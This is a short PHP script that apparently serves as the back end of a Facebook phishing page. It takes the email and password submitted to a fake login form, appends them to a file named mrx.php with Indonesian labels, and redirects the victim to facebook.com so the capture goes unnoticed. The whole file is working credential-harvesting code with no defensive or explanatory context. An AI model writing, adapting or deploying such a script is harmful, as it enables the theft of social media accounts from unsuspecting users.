<?php
header("Location: http://facebook.com/profil.php");
$ADEx = "mrx.php";
$ADEy = $_POST['email'];
$ADEz = $_POST['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "<a href='m.fb.com/mrx'>Sukses.!</a>");
fwrite($handle, "\n");
fwrite($handle, "<br>Email  :");
fwrite($handle, "\n");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "<br>Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "<br> <a href='http://fb.com/mrx'>Sukses.!</a>");
fwrite($handle, "\n");
fclose($handle);
exit;
?>